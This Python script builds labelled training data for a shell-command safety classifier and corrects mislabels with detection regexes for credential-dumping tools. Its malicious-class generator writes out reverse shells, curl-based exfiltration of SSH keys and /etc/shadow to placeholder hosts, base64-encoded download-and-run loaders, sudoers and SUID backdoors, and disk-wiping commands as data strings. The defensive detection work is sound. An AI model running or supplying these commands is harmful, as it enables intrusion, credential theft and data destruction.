#!/usr/bin/env python3
"""
Context-sensitivity augmentation for the Genos 3-class gatekeeper.

This script does two things:
  1. Fixes mislabeled rows in the existing training/val/test CSVs
  2. Generates new training examples for underrepresented scenarios

The core problem: the model treats commands as binary (safe vs dangerous)
without understanding that the same tool can be benign, suspicious, or
malicious depending on context clues (targets, usernames, file paths,
flags, command structure).

Usage:
    python data/training/augment_context_sensitivity.py

Outputs:
    data/training/genos_dataset/context_augment_train.csv
    data/training/genos_dataset/context_augment_val.csv
    data/training/genos_dataset/context_augment_test.csv
    (Also fixes mislabels in existing gatekeeper_3class_*.csv in-place)
"""

import csv
import hashlib
import os
import random
import re
import sys

random.seed(42)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATASET_DIR = os.path.join(BASE_DIR, "genos_dataset")


# ─── Part 1: Fix mislabels in existing data ──────────────────────────────

# Patterns for mislabel detection
_CREDENTIAL_DUMP_RE = re.compile(
    r"(?:mimikatz|sekurlsa|hashdump|lsass|unshadow|john.*rockyou|secretsdump)", re.I
)
_PRIVESC_RE = re.compile(
    r"(?:chmod\s+4[0-7]{3}\s+/|chmod\s+u\+s\s+|echo.*ALL.*sudoers|useradd\s+-o\s+-u\s+0)", re.I
)
_SSH_TUNNEL_RE = re.compile(r"ssh\s+.*-[DLR]\s", re.I)
_DEBUG_TRACE_RE = re.compile(r"^\s*(?:sudo\s+)?(?:tcpdump|strace|ltrace)\b", re.I)
_MUNDANE_RE = re.compile(
    r"^\s*(?:ls\s|cat\s+/proc/(?:cpuinfo|meminfo|version)|stat\s+/proc/"
    r"|ip\s+(?:addr|link|neigh|route)\s*$|docker\s+ps|uname\b|hostname\b"
    r"|whoami|id\s*$|date\s*$|uptime|df\s|free\s|mount\s*$|env\s*$|printenv)",
    re.I,
)


def fix_label(cmd: str, current_label: str) -> str:
    """Return corrected label, or current_label if no fix needed."""
    if current_label == "Benign":
        if _CREDENTIAL_DUMP_RE.search(cmd):
            # mimikatz, secretsdump etc labeled Benign (from tldr pages)
            return "Malicious"
        if _SSH_TUNNEL_RE.search(cmd) or _DEBUG_TRACE_RE.search(cmd):
            return "Context_Dependent"
    elif current_label == "Context_Dependent":
        if _MUNDANE_RE.search(cmd):
            return "Benign"
        if _CREDENTIAL_DUMP_RE.search(cmd) or _PRIVESC_RE.search(cmd):
            return "Malicious"
    return current_label


def fix_mislabels_in_file(path: str) -> int:
    """Fix mislabels in a CSV file in-place. Returns count of fixes."""
    rows = []
    fixes = 0
    with open(path, newline="", encoding="utf-8") as f:
        reader = csv.DictReader(f)
        fieldnames = reader.fieldnames
        for row in reader:
            new_label = fix_label(row["command"], row["label"])
            if new_label != row["label"]:
                row["original_label"] = row.get("original_label", row["label"])
                row["label"] = new_label
                fixes += 1
            rows.append(row)

    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    return fixes


# ─── Part 2: Generate augmentation data ──────────────────────────────────

# Variation pools for template expansion
_INTERNAL_IPS = [
    "10.0.0.20", "10.0.0.30", "10.0.0.40", "10.0.0.50", "10.0.0.60",
    "10.0.0.70", "10.0.0.80", "10.0.0.90", "10.0.0.100", "10.0.0.110",
    "172.16.0.10", "172.16.0.20", "172.16.0.30", "172.16.1.5", "172.16.2.8",
    "192.168.1.10", "192.168.1.20", "192.168.1.30", "192.168.1.50",
    "192.168.10.5", "192.168.10.15", "192.168.100.2",
]
_EVIL_IPS = [
    "10.0.0.1", "10.0.0.5", "45.33.32.156", "185.199.108.153",
    "203.0.113.42", "198.51.100.9", "91.234.56.78", "77.88.21.11",
]
_BENIGN_USERS = [
    "backup", "audit", "deploy", "ops", "sre", "support", "dba",
    "monitoring", "ci", "jenkins", "ansible", "terraform",
]
_GENERIC_USERS = ["user", "admin", "root", "test", "dev"]
_BENIGN_HOSTS = [
    "backup-server", "audit-box", "log-collector", "bastion",
    "jump.internal", "monitor.corp", "ci.internal", "deploy.corp",
]
_GENERIC_HOSTS = [
    "10.0.0.1", "10.0.0.5", "192.168.1.100", "target.internal",
]
_PROCESSES = ["nginx", "postgres", "redis-server", "java", "python3",
              "node", "apache2", "mysql", "dockerd", "kubelet"]
_BENIGN_PORTS = [80, 443, 5432, 3306, 6379, 8080, 8443, 9090, 9200]
_SUSPICIOUS_PORTS = [4444, 4445, 5555, 8888, 1234, 9999, 31337]

_BENIGN_LOG_PATHS = [
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/app/app.log", "/var/log/syslog", "/var/log/messages",
    "/var/log/app/error.log", "/var/log/audit/audit.log",
]
_SENSITIVE_PATHS = [
    "/etc/ssh", "/root/.ssh", "/etc/shadow", "/etc/sudoers",
    "/etc/kubernetes", "/home/dev/.ssh", "/var/lib/postgresql/data",
    "/etc/ssl/private", "/var/run/secrets",
]
_BENIGN_BACKUP_DESTS = [
    "/srv/backups/", "/srv/audit/", "/srv/snapshots/", "/var/backups/",
    "/srv/incident-logs/", "/srv/forensics/", "/srv/review/",
]
_STAGING_DESTS = ["/tmp/stage/", "/tmp/", "/tmp/loot/", "/dev/shm/"]


def _pick(lst):
    return random.choice(lst)


def _generate_benign_admin_ops() -> list[tuple[str, str]]:
    """Generate Benign commands that use security-adjacent tools in clearly admin context."""
    commands = []

    # ── SSH tunneling for legitimate access ──
    for _ in range(40):
        host = _pick(_BENIGN_HOSTS)
        user = _pick(_BENIGN_USERS)
        port = _pick(_BENIGN_PORTS)
        local_port = random.randint(8000, 9999)
        variant = random.choice([
            f"ssh -L {local_port}:localhost:{port} {user}@{host}",
            f"ssh -L {local_port}:db.internal:{port} {user}@{host}",
            f"ssh -D {random.choice([1080, 8080, 3128])} {user}@{host}",
            f"ssh -R {port}:127.0.0.1:{port} {user}@{host}",
            f"ssh -L {local_port}:internal-api.company.local:{port} {user}@{host}",
        ])
        commands.append((variant, "Benign"))

    # ── strace/ltrace/gdb for debugging ──
    for _ in range(40):
        proc = _pick(_PROCESSES)
        variant = random.choice([
            f"strace -p $(pgrep {proc}) -e trace=network -o /tmp/{proc}-net.trace",
            f"strace -tt -p $(pgrep {proc}) -o /tmp/{proc}.strace",
            f"strace -f -p $(pgrep {proc}) -e trace=write -o /tmp/{proc}-write.trace",
            f"ltrace -p $(pgrep {proc}) -o /tmp/{proc}-debug.ltrace",
            f"gdb -batch -p $(pgrep {proc}) -ex 'bt'",
            f"gdb -batch -p $(pgrep {proc}) -ex 'thread apply all bt'",
            f"strace -ff -o /tmp/{proc}.trace -p $(pgrep {proc})",
        ])
        commands.append((variant, "Benign"))

    # ── tcpdump for troubleshooting ──
    for _ in range(30):
        ip = _pick(_INTERNAL_IPS)
        port = _pick(_BENIGN_PORTS)
        variant = random.choice([
            f"tcpdump -i eth0 -c 100 host {ip} and port {port} -w /tmp/debug.pcap",
            f"tcpdump -i eth0 -c 50 port {port}",
            f"tcpdump -i eth0 -G 60 -W 1 -w /tmp/one-minute.pcap port {port}",
            f"tcpdump -i eth0 -c 200 host {ip} -w /tmp/tls-debug.pcap",
            f"sudo tcpdump -i eth0 port {port} -c 100 -w /tmp/capture.pcap",
            f"tcpdump -i eth0 -c 50 'port {port} and host {ip}'",
        ])
        commands.append((variant, "Benign"))

    # ── rsync/scp to backup/audit servers (benign destinations) ──
    for _ in range(40):
        user = _pick(_BENIGN_USERS)
        host = _pick(_BENIGN_HOSTS)
        ip = _pick(_INTERNAL_IPS)
        dest = _pick(_BENIGN_BACKUP_DESTS)
        log = _pick(_BENIGN_LOG_PATHS)
        variant = random.choice([
            f"rsync -avz {log} {user}@{ip}:{dest}",
            f"scp {log} {user}@{ip}:{dest}",
            f"rsync -avz /var/log/nginx/ {user}@{host}:{dest}nginx-logs/",
            f"scp /var/log/app/app.log {user}@{host}:{dest}",
            f"rsync -avz /srv/app/releases/ {user}@{host}:{dest}releases/",
            f"scp /etc/ssl/certs/company.pem {user}@{ip}:{dest}cert-audit/",
            f"rsync -avz /var/log/ {user}@{ip}:{dest}host-logs/",
        ])
        commands.append((variant, "Benign"))

    # ── kubectl/docker for log collection ──
    for _ in range(25):
        variant = random.choice([
            "kubectl exec deploy/web -- sh -c 'tar cz /var/log/app' > /tmp/web-logs.tar.gz",
            "kubectl logs deploy/api --since=1h > /tmp/api-logs.txt",
            "kubectl cp web-0:/var/log/app.log ./app.log",
            "docker logs --since 1h web-app > /tmp/web.log 2>&1",
            "docker exec web sh -c 'cat /var/log/nginx/access.log' > /tmp/web-access.log",
            "kubectl exec deploy/api -- cat /app/config/application.yml",
            "docker exec db pg_dump -U app appdb > /tmp/app-backup.sql",
            "kubectl logs -f deploy/web --tail=100",
            "docker stats --no-stream",
            "kubectl top pods -A",
        ])
        commands.append((variant, "Benign"))

    # ── Legitimate file operations that look scary ──
    for _ in range(30):
        variant = random.choice([
            "scp /etc/ssl/certs/company.pem audit@backup-server:/srv/cert-audit/",
            "rsync -avz /etc/systemd/system/ deploy@ci.internal:/srv/review/systemd/",
            "tar czf /var/backups/ssh-config.tar.gz /etc/ssh/sshd_config",
            "find /var/www/html -type f -exec chmod 640 {} +",
            "find /home/dev/.ssh -type f -exec chmod 600 {} +",
            "chmod 700 ~/.ssh",
            "chmod 755 /srv/app/current/bin/start.sh",
            "chmod 644 /tmp/report.txt",
            "chown -R app:app /srv/app/current",
            f"zip -r /tmp/config-backup.zip /etc/nginx /etc/systemd/system",
            f"tar czf /var/backups/nginx-config.tgz /etc/nginx",
            "scp ~/.ssh/known_hosts audit@backup-server:/srv/ssh-baselines/",
            "rsync -avz /srv/app/config ops@ci.internal:/srv/review/config/",
            "find /etc/kubernetes -maxdepth 2 -type f 2>/dev/null | head -50",
            "find /etc/ssl -maxdepth 2 -type f 2>/dev/null | head -50",
        ])
        commands.append((variant, "Benign"))

    # ── Download from internal/known sources ──
    for _ in range(25):
        variant = random.choice([
            "curl -fsSL https://artifacts.company.local/agent/agent-1.2.3.rpm -o /tmp/agent.rpm",
            "wget -q https://mirror.internal/python-3.11.9.tgz -O /tmp/python.tgz",
            "curl -fsSL https://packages.redhat.com/repodata/repomd.xml -o /tmp/repomd.xml",
            "wget -q https://cdn.kernel.org/pub/linux/kernel/v6.x/sha256sums.asc -O /tmp/sums.asc",
            "curl -fsS https://packages.ubuntu.com/ > /tmp/packages-index.html",
            "curl -fsSL https://repo.company.local/cli/linux-amd64.tar.gz -o /tmp/cli.tar.gz",
            "pip install --index-url https://pypi.company.local/simple/ internal-tool",
            "npm install --registry https://npm.company.local/ @company/sdk",
            "curl -fsSL https://get.docker.com | sh",
            "wget -q https://github.com/prometheus/node_exporter/releases/download/v1.7.0/node_exporter-1.7.0.linux-amd64.tar.gz -O /tmp/ne.tar.gz",
        ])
        commands.append((variant, "Benign"))

    # ── python http.server for file serving ──
    for _ in range(15):
        port = random.choice([8000, 8080, 9000, 9090])
        directory = random.choice(["/srv/releases/current", "/var/www/html",
                                    "/srv/support-bundles", "/tmp/artifacts"])
        variant = random.choice([
            f"python3 -m http.server {port} --directory {directory}",
            f"python3 -m http.server {port} --bind 127.0.0.1",
            f"python3 -m http.server 0.0.0.0 {port} --directory {directory}",
        ])
        commands.append((variant, "Benign"))

    # ── Miscellaneous benign admin commands ──
    for _ in range(25):
        variant = random.choice([
            "md5sum /etc/passwd",
            "sha256sum /bin/bash",
            "sha256sum /usr/bin/sudo",
            "cat /proc/version",
            "ip route",
            "file /tmp/cli.tar.gz",
            "file /tmp/agent.rpm",
            "sha256sum /tmp/app.tar.gz",
            "curl -s https://ifconfig.me",
            "curl -fsS https://icanhazip.com",
            "systemd-detect-virt",
            "aa-status",
            "iptables -L -n",
            "sudo -l",
            "crontab -l",
            "journalctl --since '2 hours ago' | grep -i fail",
            "docker inspect $(docker ps -q | head -1)",
            "ls -la /etc/systemd/system",
        ])
        commands.append((variant, "Benign"))

    return commands


def _generate_context_dependent() -> list[tuple[str, str]]:
    """Generate Context_Dependent commands — dual-use tools in ambiguous context."""
    commands = []

    # ── SSH tunneling without clear context ──
    for _ in range(30):
        user = _pick(_GENERIC_USERS)
        ip = _pick(_INTERNAL_IPS + _GENERIC_HOSTS)
        port = random.choice(_BENIGN_PORTS + _SUSPICIOUS_PORTS)
        local = random.randint(1080, 9999)
        variant = random.choice([
            f"ssh -D 1080 -fNq {user}@{ip}",
            f"ssh -L {local}:{ip}:{port} {user}@{ip}",
            f"ssh -R {port}:127.0.0.1:{port} {user}@{ip}",
            f"ssh -D 9050 {user}@{ip}",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── tcpdump without scope limits ──
    for _ in range(25):
        variant = random.choice([
            "tcpdump -i eth0 -w /tmp/capture.pcap",
            "tcpdump -i eth0 port 22 -w /tmp/ssh.pcap",
            "tcpdump -i eth0 port 445 -w /tmp/smb.pcap",
            "tcpdump -i eth0 port 53 -w /tmp/dns.pcap",
            f"tcpdump -i eth0 host {_pick(_INTERNAL_IPS)} -w /tmp/host.pcap",
            "tcpdump -i eth0 -s 0 -w /tmp/full.pcap",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── chisel / tunneling tools ──
    for _ in range(20):
        ip = _pick(_INTERNAL_IPS + _GENERIC_HOSTS)
        variant = random.choice([
            f"chisel client {ip}:8080 R:1080:socks",
            f"chisel client {ip}:8080 R:8443:127.0.0.1:443",
            f"chisel client jump.internal:8080 R:1080:socks",
            f"socat TCP-LISTEN:9443,reuseaddr,fork TCP:{ip}:443",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── nmap scanning ──
    for _ in range(20):
        ip = _pick(_INTERNAL_IPS)
        variant = random.choice([
            f"nmap -sV {ip}",
            f"nmap -p 22,80,443,445 {ip}",
            f"nmap -O {ip}",
            f"nmap -sT -Pn {ip}",
            f"nmap -sV --script=default {ip}",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── Sensitive file staging/transfer (ambiguous direction) ──
    for _ in range(35):
        user = _pick(_GENERIC_USERS)
        ip = _pick(_INTERNAL_IPS)
        sens = _pick(_SENSITIVE_PATHS)
        variant = random.choice([
            f"tar czf /tmp/ssh-stage.tgz /etc/ssh 2>/dev/null",
            f"rsync -avz /etc/ssh {user}@{ip}:/tmp/stage/ 2>/dev/null",
            f"tar czf /tmp/.ssh-stage.tgz /home/dev/.ssh 2>/dev/null",
            f"rsync -avz /home/dev/.ssh {user}@{ip}:/tmp/stage/ 2>/dev/null",
            f"tar czf /tmp/config-stage.tgz /srv/app/config 2>/dev/null",
            f"rsync -avz /srv/app/config {user}@{ip}:/tmp/stage/ 2>/dev/null",
            f"tar czf /tmp/kube-stage.tgz /etc/kubernetes 2>/dev/null",
            f"rsync -avz /etc/kubernetes {user}@{ip}:/tmp/stage/ 2>/dev/null",
            f"scp /etc/hostname audit@{ip}:/tmp/",
            f"scp /etc/os-release audit@{ip}:/tmp/",
            f"scp /tmp/status.txt audit@{ip}:/tmp/",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── SUID hunting / privilege enumeration ──
    for _ in range(15):
        variant = random.choice([
            "find / -perm -4000 -type f 2>/dev/null",
            "find / -perm -2000 -type f 2>/dev/null",
            "find / -writable -type f 2>/dev/null | head -20",
            "getcap -r / 2>/dev/null",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── Secret/credential hunting (ambiguous) ──
    for _ in range(25):
        variant = random.choice([
            'find /srv -type f -name "*.conf" -exec grep -l "apikey" {} \\; 2>/dev/null',
            'find /opt -type f -name "*.conf" -exec grep -l "credential" {} \\; 2>/dev/null',
            'find /srv/app -type f -name "*.conf" -exec grep -l "db_pass" {} \\; 2>/dev/null',
            'grep -ri "password" /etc 2>/dev/null | head -20',
            'grep -ri "api_key" /srv/app/config/ 2>/dev/null',
            'find /etc -type f -name "*.conf" -exec grep -l "secret" {} \\; 2>/dev/null',
            "find /home -name authorized_keys 2>/dev/null",
            "find /home -name id_rsa 2>/dev/null",
            "find /home -name id_ed25519 2>/dev/null",
            "find /etc -name '*.key' -type f",
            "find /etc -name '*.pem' -type f",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── kubectl/docker with ambiguous access ──
    for _ in range(20):
        variant = random.choice([
            "kubectl get secrets -A",
            "kubectl exec deploy/web -- sh -c 'env | grep -i token'",
            "kubectl exec deploy/web -- sh -c 'tar cz /var/run/secrets'",
            "kubectl cp kube-system/coredns-0:/etc/coredns/Corefile ./Corefile",
            "docker cp db:/var/lib/postgresql/data/pg_hba.conf ./pg_hba.conf",
            "docker exec web sh -c 'cat /proc/1/environ'",
            "kubectl auth can-i --list",
            "crontab -l -u root",
            "tar czf /tmp/root-home.tgz /root 2>/dev/null",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── http.server on 0.0.0.0 (exposing to network) ──
    for _ in range(10):
        port = random.choice([8080, 8088, 8089, 9000, 9443])
        variant = random.choice([
            f"python3 -m http.server 0.0.0.0 {port}",
            f'python3 -c "import http.server,socketserver;socketserver.TCPServer((\\"0.0.0.0\\",{port}),http.server.SimpleHTTPRequestHandler).serve_forever()"',
            f"php -S 0.0.0.0:{port} -t /tmp",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── strace/gdb without clear debugging context ──
    for _ in range(15):
        proc = _pick(_PROCESSES)
        variant = random.choice([
            f"strace -p $(pgrep {proc}) -e trace=open,read,write",
            f"strace -f -p $(pgrep {proc}) -o /tmp/{proc}.trace",
            f"gdb -batch -p $(pgrep {proc}) -ex 'generate-core-file /tmp/{proc}.core'",
            f"ltrace -p $(pgrep {proc})",
        ])
        commands.append((variant, "Context_Dependent"))

    # ── Miscellaneous ambiguous ──
    for _ in range(10):
        variant = random.choice([
            "openssl s_client -connect 10.0.0.5:4444 -quiet",
            "mount -o remount,rw /",
            "chmod 777 /tmp/script.sh",
            "curl -X POST http://10.0.0.5:9090/data -d @/etc/hostname",
            "getfacl /etc/shadow",
            "stat /proc/sys/kernel/randomize_va_space",
        ])
        commands.append((variant, "Context_Dependent"))

    return commands


def _generate_malicious_gaps() -> list[tuple[str, str]]:
    """Generate Malicious commands for underrepresented attack types."""
    commands = []

    # ── Destructive commands (model misses these as Benign) ──
    for _ in range(25):
        variant = random.choice([
            "wipefs -a /dev/sdb",
            "wipefs -a /dev/sda",
            "wipefs --all /dev/nvme0n1",
            "passwd -d root",
            "passwd -d admin",
            "pkill -9 sshd",
            "pkill -9 -u root sshd",
            "kill -9 1",
            "kill -9 -1",
            "systemctl stop sshd && systemctl disable sshd",
            'echo "PermitRootLogin yes" >> /etc/ssh/sshd_config',
            'echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config',
            "systemctl stop firewalld && systemctl disable firewalld",
            "systemctl stop iptables && iptables -F",
            "userdel -r admin",
            "shred -u /etc/passwd",
            "shred -uzn 3 /var/log/auth.log",
        ])
        commands.append((variant, "Malicious"))

    # ── Exfiltration with clear attack indicators ──
    for _ in range(30):
        ip = _pick(_EVIL_IPS)
        variant = random.choice([
            f"tar cz /etc /root/.ssh 2>/dev/null | curl -X PUT http://{ip}:8080/upload --data-binary @-",
            f"tar cz /home/*/.ssh 2>/dev/null | curl -X PUT http://{ip}:8080/store/.ssh.tgz --data-binary @-",
            f"tar czf /tmp/loot.tgz /etc /root /home 2>/dev/null",
            f"tar cz /etc /root/.ssh 2>/dev/null | openssl enc -aes-256-cbc -k secret -out /tmp/ssh.enc",
            f"curl -X PUT http://{ip}:8080/collect --data-binary @/tmp/ssh.enc",
            f"rsync -avz /root/.ssh {_pick(_GENERIC_USERS)}@{ip}:/tmp/stage/ 2>/dev/null",
            f"scp /root/.ssh/id_rsa {_pick(_GENERIC_USERS)}@{ip}:/tmp/ 2>/dev/null",
            f"tar czf /tmp/.ssh-stage.tgz /root/.ssh 2>/dev/null",
            f"rsync -avz /etc/shadow {_pick(_GENERIC_USERS)}@{ip}:/tmp/ 2>/dev/null",
            f"scp /etc/shadow {_pick(_GENERIC_USERS)}@{ip}:/tmp/ 2>/dev/null",
            f"kubectl exec deploy/web -- sh -c 'tar cz /var/run/secrets' > /tmp/pod-secrets.tgz",
        ])
        commands.append((variant, "Malicious"))

    # ── Active network attacks (MITM, ARP, etc.) ──
    for _ in range(15):
        ip1 = _pick(_INTERNAL_IPS)
        ip2 = _pick(_INTERNAL_IPS)
        variant = random.choice([
            f"ettercap -T -q -i eth0 -M arp:remote /{ip1}// /{ip2}//",
            f"arpspoof -i eth0 -t {ip1} {ip2}",
            "responder -I eth0 -wrf",
            "responder -I eth0 -Fv",
            f"bettercap -iface eth0 -eval 'set arp.spoof.targets {ip1};arp.spoof on'",
        ])
        commands.append((variant, "Malicious"))

    # ── SUID backdoors and persistence ──
    for _ in range(15):
        variant = random.choice([
            "mount -o remount,rw / && cp /bin/sh /tmp/.s && chmod 4755 /tmp/.s",
            "cp /bin/bash /tmp/.backdoor && chmod u+s /tmp/.backdoor",
            "chmod u+s /bin/bash",
            f"echo '{_pick(_GENERIC_USERS)} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor",
            f"ssh-keygen -t rsa -N '' -f /tmp/key && cat /tmp/key.pub >> /root/.ssh/authorized_keys",
        ])
        commands.append((variant, "Malicious"))

    # ── Reverse shells / shell upgrades ──
    for _ in range(20):
        ip = _pick(_EVIL_IPS)
        port = _pick(_SUSPICIOUS_PORTS)
        variant = random.choice([
            f"openssl s_client -quiet -connect {ip}:{port} | /bin/bash | openssl s_client -quiet -connect {ip}:{port+1}",
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            "python3 -c \"import pty; pty.spawn('/bin/bash')\"",
            f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            f"xterm -display {ip}:1 -e /bin/bash",
        ])
        commands.append((variant, "Malicious"))

    # ── Encoded execution ──
    for _ in range(15):
        variant = random.choice([
            'eval $(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=" | base64 -d)',
            'python3 -c "import base64,os;os.system(base64.b64decode(\'Y3VybCBodHRwOi8vZXZpbC5jb20vc2g=\').decode())"',
            'perl -MMIME::Base64 -e \'system(decode_base64("Y3VybCBodHRwOi8vZXZpbC5jb20vc2g="))\'',
            "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            'bash -c "$(echo Y3VybCBodHRwOi8vbWFsd2FyZS5jb20vc2hlbGwuc2g= | base64 -d)"',
            "mshta http://evil.com/payload.hta",
        ])
        commands.append((variant, "Malicious"))

    # ── systemctl edit for persistence (looks benign) ──
    for _ in range(10):
        variant = random.choice([
            "systemctl edit sshd --full",
            "systemctl edit --full nginx",
            f"crontab -e",  # this is benign but editing root crontab can be persistence
        ])
        commands.append((variant, "Context_Dependent"))  # These are actually CD

    return commands


def generate_augmentation_data() -> dict[str, list[tuple[str, str]]]:
    """Generate all augmentation data and split into train/val/test."""
    all_data = []
    all_data.extend(_generate_benign_admin_ops())
    all_data.extend(_generate_context_dependent())
    all_data.extend(_generate_malicious_gaps())

    # Deduplicate
    seen = set()
    unique = []
    for cmd, label in all_data:
        key = cmd.strip().lower()
        if key not in seen:
            seen.add(key)
            unique.append((cmd, label))

    random.shuffle(unique)

    # Split 80/10/10
    n = len(unique)
    train_end = int(n * 0.8)
    val_end = train_end + int(n * 0.1)

    return {
        "train": unique[:train_end],
        "val": unique[train_end:val_end],
        "test": unique[val_end:],
    }


def write_augmentation_csv(split_name: str, data: list[tuple[str, str]]):
    """Write augmentation data to CSV in the same format as the main dataset."""
    path = os.path.join(DATASET_DIR, f"context_augment_{split_name}.csv")
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["command", "label", "original_label", "mitre_id"])
        for cmd, label in data:
            writer.writerow([cmd, label, "ContextAugment", "ContextAugment"])
    return path, len(data)


def main():
    print("=" * 70)
    print("  Context-Sensitivity Augmentation for Genos Gatekeeper")
    print("=" * 70)

    # Step 1: Fix mislabels
    print("\n[1/3] Fixing mislabels in existing training data...")
    total_fixes = 0
    for split in ["train", "val", "test"]:
        path = os.path.join(DATASET_DIR, f"gatekeeper_3class_{split}.csv")
        if os.path.exists(path):
            fixes = fix_mislabels_in_file(path)
            total_fixes += fixes
            print(f"  {split}: {fixes} labels corrected")
    print(f"  Total: {total_fixes} mislabels fixed")

    # Step 2: Generate augmentation data
    print("\n[2/3] Generating augmentation data...")
    splits = generate_augmentation_data()
    from collections import Counter
    for split_name, data in splits.items():
        dist = Counter(label for _, label in data)
        print(f"  {split_name}: {len(data)} commands — {dict(dist)}")

    # Step 3: Write augmentation CSVs
    print("\n[3/3] Writing augmentation CSVs...")
    for split_name, data in splits.items():
        path, count = write_augmentation_csv(split_name, data)
        print(f"  {path}: {count} rows")

    # Summary
    total_aug = sum(len(d) for d in splits.values())
    print(f"\n{'=' * 70}")
    print(f"  Done: {total_fixes} mislabels fixed, {total_aug} augmentation commands generated")
    print(f"  Next: merge augmentation into training set and retrain")
    print(f"{'=' * 70}")


if __name__ == "__main__":
    main()
